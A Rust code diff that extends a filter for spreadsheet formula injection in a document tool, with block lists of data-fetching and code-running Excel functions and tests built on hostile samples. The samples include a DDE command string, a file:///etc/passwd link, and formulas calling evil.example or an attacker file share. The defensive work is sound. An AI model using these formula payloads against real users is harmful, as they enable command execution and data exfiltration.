@@ -416,10 +416,12 @@ fn check_batch(commands: &mut [Value]) -> Result<(), String> {
     Ok(())
 }
 
-/// Functions a workbook's formulas may not name: they fetch from a server
-/// (WEBSERVICE, IMAGE, RTD, FILTERXML over what WEBSERVICE fetched) or run
-/// code (CALL, REGISTER, REGISTER.ID, EXEC). Matched as words at any `.`
-/// too, so `_xlfn.IMAGE` and `REGISTER.ID` are refused.
+/// Functions a workbook's formulas may not name (R50, R53): they fetch from
+/// a server or another file (WEBSERVICE, IMAGE, RTD, FILTERXML over what was
+/// fetched, STOCKHISTORY, TRANSLATE, DETECTLANGUAGE, COPILOT, the IMPORT…
+/// functions), run code (CALL, REGISTER, REGISTER.ID, EXEC, PY), or read a
+/// reference built from text (INDIRECT). Matched as words, which end at a
+/// `.` too, so `_xlfn.IMAGE`, `_xlfn._xlws.PY` and `REGISTER.ID` are refused.
 const FORMULA_FUNCTIONS: &[&str] = &[
     "WEBSERVICE",
     "IMAGE",
@@ -428,19 +430,36 @@ const FORMULA_FUNCTIONS: &[&str] = &[
     "REGISTER",
     "EXEC",
     "FILTERXML",
+    "STOCKHISTORY",
+    "TRANSLATE",
+    "DETECTLANGUAGE",
+    "COPILOT",
+    "IMPORTTEXT",
+    "IMPORTCSV",
+    "IMPORTDATA",
+    "IMPORTRANGE",
+    "IMPORTXML",
+    "IMPORTHTML",
+    "PY",
+    "INDIRECT",
 ];
+/// Families refused by their names' start: CUBEVALUE, CUBEMEMBER, CUBESET…
+/// read an OLAP server.
+const FORMULA_FAMILIES: &[&str] = &["CUBE"];
 /// The xlsx properties officecli writes as a formula whatever they hold
 /// (`ref` and `refersTo` are a named range's formula).
 const FORMULA_KEYS: &[&str] = &["formula", "formula1", "formula2", "refersto", "ref"];
-/// The xlsx elements whose every value officecli writes as a formula:
-/// conditional formats (a `cellis` value is a formula without `=`),
-/// validations and named ranges.
-const FORMULA_TYPES: &[&str] = &[
+/// The xlsx elements whose values may be formulas without a leading `=`, by
+/// `type` or in a path (`/Sheet1/cf[1]`), named in lower case without `-`
+/// and `_`: conditional formats (a `cellis` value is a formula),
+/// validations, named ranges, charts, sparklines and tables.
+const FORMULA_TARGETS: &[&str] = &[
+    "cf",
+    "conditionalformatting",
     "aboveaverage",
     "cellis",
     "cfextended",
     "colorscale",
-    "conditionalformatting",
     "containstext",
     "databar",
     "dateoccurring",
@@ -453,25 +472,34 @@ const FORMULA_TYPES: &[&str] = &[
     "datavalidation",
     "namedrange",
     "definedname",
+    "chart",
+    "chartseries",
+    "chartaxis",
+    "sparkline",
+    "table",
 ];
+/// What starts a formula: Excel reads a leading `+`, `-` or `@` as `=`.
+const FORMULA_STARTS: &[char] = &['=', '+', '-', '@'];
 /// What a workbook file is named: a name before `!` that ends so refers to
 /// another workbook.
 const WORKBOOK_EXTENSIONS: &[&str] = &[
     ".xls", ".xlsx", ".xlsm", ".xlsb", ".xla", ".xlam", ".xlt", ".xltx", ".xltm", ".ods", ".csv",
 ];
 
-/// The formulas of an xlsx batch (R50): every property officecli writes as
-/// a formula — a [`FORMULA_KEYS`] key, any value of a [`FORMULA_TYPES`]
-/// element, any value that starts with `=` (a column name may be a key) —
-/// names no [`FORMULA_FUNCTIONS`], has no DDE link and no other workbook,
-/// and no file share or address outside HYPERLINK's link. Excel evaluates
-/// what passes: formulas are filtered, not sandboxed.
+/// The formulas of an xlsx batch (R50, R53). A property is read as a
+/// formula when it may be one: a [`FORMULA_KEYS`] key, any value of an item
+/// on a [`FORMULA_TARGETS`] element, any value that starts like a formula
+/// (a row takes its table's column names as keys). A formula names no
+/// [`FORMULA_FUNCTIONS`], has no DDE link, no other workbook, and no file
+/// share or address outside HYPERLINK's quoted link. A table's inline rows
+/// hold values only. Excel evaluates what passes: formulas are filtered,
+/// not sandboxed.
 fn check_formulas(commands: &[Value]) -> Result<(), String> {
     for (index, item) in commands.iter().enumerate() {
         let Some(fields) = item.as_object() else {
             continue;
         };
-        let every = FORMULA_TYPES.contains(&element_type(fields).as_str());
+        let targeted = holds_formulas(fields);
         let Some(props) = fields.get("props").and_then(Value::as_object) else {
             continue;
         };
@@ -481,8 +509,17 @@ fn check_formulas(commands: &[Value]) -> Result<(), String> {
             };
             let lower = key.to_ascii_lowercase();
             let last = lower.rsplit('.').next().unwrap_or(&lower);
-            let formula = every || FORMULA_KEYS.contains(&last) || text.trim().starts_with('=');
-            if let Some(why) = formula.then(|| refused_formula(text)).flatten() {
+            let why = if lower == "data" {
+                refused_data_cells(text)
+            } else if targeted
+                || FORMULA_KEYS.contains(&last)
+                || text.trim().starts_with(FORMULA_STARTS)
+            {
+                refused_formula(text)
+            } else {
+                None
+            };
+            if let Some(why) = why {
                 return Err(refuse(
                     FAILED,
                     format!("item {index}: \"props.{key}\" {why}"),
@@ -491,6 +528,50 @@ fn check_formulas(commands: &[Value]) -> Result<(), String> {
         }
     }
     Ok(())
+}
+
+/// Whether an item's values may be formulas without `=`: its `type`, or a
+/// segment of a path it names (past the sheet's name, when there are
+/// several), is one of [`FORMULA_TARGETS`].
+fn holds_formulas(fields: &Map<String, Value>) -> bool {
+    let target = |name: &str| {
+        let name: String = name
+            .chars()
+            .filter(|c| !matches!(c, '-' | '_'))
+            .collect::<String>()
+            .to_ascii_lowercase();
+        FORMULA_TARGETS.contains(&name.trim())
+    };
+    let named = ELEMENT_FIELDS
+        .iter()
+        .filter_map(|field| fields.get(*field)?.as_str())
+        .any(|path| {
+            let segments: Vec<&str> = path
+                .trim_start_matches('/')
+                .split('/')
+                .map(|segment| segment.split('[').next().unwrap_or_default())
+                .collect();
+            let sheet = usize::from(segments.len() > 1);
+            segments.iter().skip(sheet).any(|segment| target(segment))
+        });
+    named
+        || fields
+            .get("type")
+            .and_then(Value::as_str)
+            .is_some_and(target)
+}
+
+/// Why a table's inline rows are refused, if they are: a cell (split at
+/// `,`, `;` and line breaks) that starts like a formula and is not a
+/// number. Table data holds values; a formula goes in its cell's `formula`.
+fn refused_data_cells(text: &str) -> Option<String> {
+    text.split([',', ';', '\n', '\r'])
+        .map(|cell| cell.trim().trim_matches('"').trim())
+        .any(|cell| cell.starts_with(FORMULA_STARTS) && cell.parse::<f64>().is_err())
+        .then(|| {
+            "has a cell that starts with =, +, - or @ and is not a number; table rows hold values only: set a formula with \"formula\" on its cell"
+                .into()
+        })
 }
 
 /// Why a formula is refused, if it is. Each check reads the whole text,
@@ -502,9 +583,15 @@ fn refused_formula(text: &str) -> Option<String> {
             .filter(|word| !word.is_empty())
             .map(str::to_ascii_uppercase)
     };
-    if let Some(name) = words().find(|word| FORMULA_FUNCTIONS.contains(&word.as_str())) {
+    let refused = |word: &String| {
+        FORMULA_FUNCTIONS.contains(&word.as_str())
+            || FORMULA_FAMILIES
+                .iter()
+                .any(|family| word.starts_with(family))
+    };
+    if let Some(name) = words().find(refused) {
         return Some(format!(
-            "names {name}: a formula cannot use WEBSERVICE, IMAGE, RTD, CALL, REGISTER, REGISTER.ID, EXEC or FILTERXML, even in quoted text"
+            "names {name}: a formula cannot use a function that fetches, runs code or builds a reference from text (WEBSERVICE, IMAGE, INDIRECT, STOCKHISTORY, CUBE…, IMPORT…, PY and others), even in quoted text"
         ));
     }
     if text.contains('|') {
@@ -513,14 +600,30 @@ fn refused_formula(text: &str) -> Option<String> {
                 .into(),
         );
     }
+    if text.to_ascii_lowercase().contains("file:") {
+        return Some("names a file: address; a formula cannot".into());
+    }
+    let Some(addresses) = hyperlink_addresses(text) else {
+        return Some(
+            "uses HYPERLINK without one quoted https:, http:, mailto: or # address as its first argument"
+                .into(),
+        );
+    };
     if refers_to_another_workbook(text) {
         return Some(
             "refers to another workbook or a file; a formula may refer only to this workbook's sheets"
                 .into(),
         );
     }
-    let outside = without_hyperlink_addresses(text);
-    if outside.contains("\\\\") || outside.contains("://") {
+    let mut outside = String::with_capacity(text.len());
+    let mut from = 0;
+    for address in addresses {
+        outside.push_str(&text[from..address.start.max(from)]);
+        outside.push(' ');
+        from = address.end.max(from);
+    }
+    outside.push_str(&text[from..]);
+    if outside.contains("\\\\") || outside.contains("//") {
         return Some(
             "names a file share or an address; only HYPERLINK's first argument may hold an https:, http: or mailto: address"
                 .into(),
@@ -573,57 +676,58 @@ fn refers_to_another_workbook(text: &str) -> bool {
     })
 }
 
-/// `text` without the address HYPERLINK links to: its first argument, when
-/// that is a quoted `https:`, `http:` or `mailto:` address.
-fn without_hyperlink_addresses(text: &str) -> String {
+/// Where in `text` HYPERLINK's addresses are: each HYPERLINK's first
+/// argument is one quoted string, followed by `,` or `)`, that starts with
+/// `https://`, `http://`, `mailto:` or `#` (a place in the workbook).
+/// `None` when one is anything else: built with `&` or a function, read
+/// from a cell, or HYPERLINK named without a call.
+fn hyperlink_addresses(text: &str) -> Option<Vec<std::ops::Range<usize>>> {
     let upper = text.to_ascii_uppercase();
-    let mut kept = String::with_capacity(text.len());
-    let mut from = 0;
-    let mut search = 0;
-    while let Some(found) = upper[search..].find("HYPERLINK") {
-        let at = search + found;
-        search = at + "HYPERLINK".len();
-        let word = |c: char| c.is_ascii_alphanumeric() || c == '_';
-        if text[..at].chars().next_back().is_some_and(word) {
+    let word = |c: char| c.is_ascii_alphanumeric() || c == '_';
+    let mut addresses = vec![];
+    for (at, name) in upper.match_indices("HYPERLINK") {
+        let end = at + name.len();
+        if text[..at].chars().next_back().is_some_and(word)
+            || text[end..].chars().next().is_some_and(word)
+        {
             continue;
         }
-        let rest = text[search..].trim_start();
-        let Some(rest) = rest.strip_prefix('(').map(str::trim_start) else {
-            continue;
-        };
-        let Some(body) = rest.strip_prefix('"') else {
-            continue;
-        };
+        let body = text[end..]
+            .trim_start()
+            .strip_prefix('(')?
+            .trim_start()
+            .strip_prefix('"')?;
         let open = text.len() - body.len();
-        // The string ends at a `"` that is not `""`.
-        let mut end = None;
-        let mut chars = body.char_indices().peekable();
-        while let Some((offset, c)) = chars.next() {
-            if c == '"' {
-                if chars.peek().is_some_and(|&(_, next)| next == '"') {
-                    chars.next();
-                } else {
-                    end = Some(open + offset);
-                    break;
-                }
+        let close = open + string_end(body)?;
+        if !text[close + 1..].trim_start().starts_with([',', ')']) {
+            return None;
+        }
+        let address = text[open..close].trim_start().to_ascii_lowercase();
+        if !["https://", "http://", "mailto:", "#"]
+            .iter()
+            .any(|start| address.starts_with(start))
+        {
+            return None;
+        }
+        addresses.push(open..close);
+    }
+    Some(addresses)
+}
+
+/// Where the quoted string `body` starts ends: the offset of its closing
+/// `"` (`""` is a quote inside it).
+fn string_end(body: &str) -> Option<usize> {
+    let mut chars = body.char_indices().peekable();
+    while let Some((offset, c)) = chars.next() {
+        if c == '"' {
+            if chars.peek().is_some_and(|&(_, next)| next == '"') {
+                chars.next();
+            } else {
+                return Some(offset);
             }
         }
-        let Some(close) = end else {
-            break;
-        };
-        let address = text[open..close].trim_start().to_ascii_lowercase();
-        if ["https://", "http://", "mailto:"]
-            .iter()
-            .any(|scheme| address.starts_with(scheme))
-        {
-            kept.push_str(&text[from..open]);
-            kept.push(' ');
-            from = close;
-        }
-        search = close.max(search);
     }
-    kept.push_str(&text[from..]);
-    kept
+    None
 }
 
 /// Element types a batch may not add: a diagram (officecli renders it in a
@@ -3436,7 +3540,7 @@ esac"#,
             // File shares and addresses, but in HYPERLINK's link.
             (
                 json!({"formula": r#"INDIRECT("\\attacker\share")"#}),
-                "file share or an address",
+                "names INDIRECT",
             ),
             (
                 json!({"formula": r#"CONCAT("https://evil.example/",B2)"#}),
@@ -3444,11 +3548,11 @@ esac"#,
             ),
             (
                 json!({"formula": r#"HYPERLINK("file:///etc/passwd","x")"#}),
-                "file share or an address",
+                "file: address",
             ),
             (
                 json!({"formula": r#"HYPERLINK("\\attacker\share","x")"#}),
-                "file share or an address",
+                "uses HYPERLINK",
             ),
             (
                 json!({"formula": r#"HYPERLINK("https://x","\\attacker\share")"#}),
@@ -3456,8 +3560,85 @@ esac"#,
             ),
             (
                 json!({"formula": r#"HYPERLINK(B2,"https://evil.example/")"#}),
+                "uses HYPERLINK",
+            ),
+            // R53: more functions, under any prefix.
+            (
+                json!({"formula": r#"_xlfn.WEBSERVICE("https://evil.example/")"#}),
+                "names WEBSERVICE",
+            ),
+            (
+                json!({"value": r#"=STOCKHISTORY("MSFT",TODAY())"#}),
+                "names STOCKHISTORY",
+            ),
+            (
+                json!({"formula": r#"CUBEVALUE("Sales","[Measures].[x]")"#}),
+                "names CUBEVALUE",
+            ),
+            (
+                json!({"formula": r#"_xlfn.CUBEMEMBER("Sales","x")"#}),
+                "names CUBEMEMBER",
+            ),
+            (
+                json!({"formula": r#"TRANSLATE(B2,"en","fr")"#}),
+                "names TRANSLATE",
+            ),
+            (
+                json!({"formula": "DETECTLANGUAGE(B2)"}),
+                "names DETECTLANGUAGE",
+            ),
+            (
+                json!({"formula": r#"COPILOT("summarize",B2:B9)"#}),
+                "names COPILOT",
+            ),
+            (json!({"formula": "IMPORTTEXT(B2)"}), "names IMPORTTEXT"),
+            (json!({"formula": "IMPORTCSV(B2)"}), "names IMPORTCSV"),
+            (json!({"formula": "IMPORTDATA(B2)"}), "names IMPORTDATA"),
+            (
+                json!({"formula": r#"IMPORTRANGE(B2,"A1")"#}),
+                "names IMPORTRANGE",
+            ),
+            (
+                json!({"formula": r#"IMPORTXML(B2,"//a")"#}),
+                "names IMPORTXML",
+            ),
+            (
+                json!({"formula": r#"IMPORTHTML(B2,"table",1)"#}),
+                "names IMPORTHTML",
+            ),
+            (json!({"formula": r#"_xlfn._xlws.PY("x",0)"#}), "names PY"),
+            (
+                json!({"formula": r#"INDIRECT("Sheet1!"&B2)"#}),
+                "names INDIRECT",
+            ),
+            // R53: `+`, `-` and `@` start a formula too.
+            (json!({"value": "+WEBSERVICE(B2)"}), "names WEBSERVICE"),
+            (json!({"value": "-IMAGE(B2)"}), "names IMAGE"),
+            (json!({"value": "@RTD(B2)"}), "names RTD"),
+            (json!({"text": "-cmd|' /C calc'!A0"}), "(DDE)"),
+            // R53: HYPERLINK's link is one quoted address, nothing built.
+            (
+                json!({"value": r#"=HYPERLINK("https://"&A1,"x")"#}),
+                "uses HYPERLINK",
+            ),
+            (
+                json!({"value": r#"=HYPERLINK("file:///x")"#}),
+                "file: address",
+            ),
+            (
+                json!({"formula": r#"HYPERLINK(CONCAT("https://x/",A1),"x")"#}),
+                "uses HYPERLINK",
+            ),
+            (
+                json!({"formula": r#"HYPERLINK(CHAR(104)&"ttps://x","x")"#}),
+                "uses HYPERLINK",
+            ),
+            (json!({"formula": "MAP(A1:A3,HYPERLINK)"}), "uses HYPERLINK"),
+            (
+                json!({"formula": r#"CONCAT("//attacker/share",B2)"#}),
                 "file share or an address",
             ),
+            (json!({"formula": r#"LEN("FILE:x")"#}), "file: address"),
         ] {
             let error = workbook(&[cell(props.clone())]).unwrap_err();
             assert_eq!(code(&error), FAILED, "{props}");
@@ -3466,6 +3647,9 @@ esac"#,
                 "{props}: {error}"
             );
         }
+        // The review's input: refused before its formula is read.
+        let item = json!({"command": "set", "path": "/Sheet1/cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}});
+        assert!(workbook(&[item]).is_err());
         // Conditional formats, validations and named ranges hold formulas
         // without `=`.
         for (item, why) in [
@@ -3488,6 +3672,53 @@ esac"#,
             (
                 json!({"command": "add", "parent": "/Sheet1", "type": "namedrange", "props": {"name": "feed", "refersTo": "[x.xlsx]Sheet1!A1"}}),
                 "another workbook",
+            ),
+            // R53: a target in the path, whatever the verb (the element
+            // checks take `/Sheet1/cf[1]` only as a selector, `cf[1]`).
+            (
+                json!({"command": "set", "path": "cf[1]", "props": {"formula": "=WEBSERVICE(B2)"}}),
+                "names WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "cf[1]", "props": {"value": "WEBSERVICE(B2)"}}),
+                "names WEBSERVICE",
+            ),
+            (
+                json!({"command": "set", "path": "data-validation[1]", "props": {"formula1": "IMAGE(B2)"}}),
+                "names IMAGE",
+            ),
+            (
+                json!({"command": "set", "selector": "Conditional_Formatting[2]", "props": {"value2": "RTD(B2)"}}),
+                "names RTD",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1/chart[1]", "type": "series", "props": {"values": "WEBSERVICE(B2)"}}),
+                "names WEBSERVICE",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "Chart-Series", "props": {"name": "INDIRECT(B2)"}}),
+                "names INDIRECT",
+            ),
+            (
+                json!({"command": "set", "path": "sparkline[1]", "props": {"range": "INDIRECT(B2)"}}),
+                "names INDIRECT",
+            ),
+            // R53: a table's rows hold values.
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B3", "data": "Name,Value\nA,=WEBSERVICE(B2)"}}),
+                "table rows hold values only",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name;@x"}}),
+                "table rows hold values only",
+            ),
+            (
+                json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:B2", "data": "Name,\" +SUM(1)\""}}),
+                "table rows hold values only",
+            ),
+            (
+                json!({"command": "set", "path": "/Sheet1/A1", "props": {"data": "-x"}}),
+                "table rows hold values only",
             ),
         ] {
             let error = workbook(std::slice::from_ref(&item)).unwrap_err();
@@ -3525,7 +3756,27 @@ esac"#,
         ] {
             workbook(&[cell(props.clone())]).unwrap_or_else(|error| panic!("{props}: {error}"));
         }
-        workbook(&[json!({"command": "add", "parent": "/Sheet1", "type": "cellis", "props": {"ref": "A1:A10", "operator": "greaterThan", "value": "50", "fill": "FFFF00"}})]).unwrap();
+        for props in [
+            json!({"value": "-3.5"}),
+            json!({"value": "+5"}),
+            json!({"value": "-B2"}),
+            json!({"value": "@B2"}),
+        ] {
+            workbook(&[cell(props.clone())]).unwrap_or_else(|error| panic!("{props}: {error}"));
+        }
+        for item in [
+            json!({"command": "add", "parent": "/Sheet1", "type": "cellis", "props": {"ref": "A1:A10", "operator": "greaterThan", "value": "50", "fill": "FFFF00"}}),
+            json!({"command": "add", "parent": "/Sheet1", "type": "table", "props": {"ref": "A1:C4", "name": "Sales", "data": "Name,Delta,Share\nNorth,-3.5,+2\nSouth,4,\"-0.25\"\nWest,1e3,https://example.com"}}),
+            json!({"command": "add", "parent": "/Sheet1", "type": "chart", "props": {"chartType": "column", "dataRange": "Sheet1!A1:B5", "title": "Revenue"}}),
+        ] {
+            workbook(std::slice::from_ref(&item)).unwrap_or_else(|error| panic!("{item}: {error}"));
+        }
+        // A sheet named like a target roots plain cells.
+        workbook(&[
+            json!({"command": "set", "path": "/Sheet1", "props": {"name": "Chart"}}),
+            json!({"command": "set", "path": "/Chart/A1", "props": {"value": "See https://example.com"}}),
+        ])
+        .unwrap();
         // Every formula the bundled skills teach.
         let commands: Vec<Value> =
             serde_json::from_str(include_str!("testdata/skill-batches.json")).unwrap();
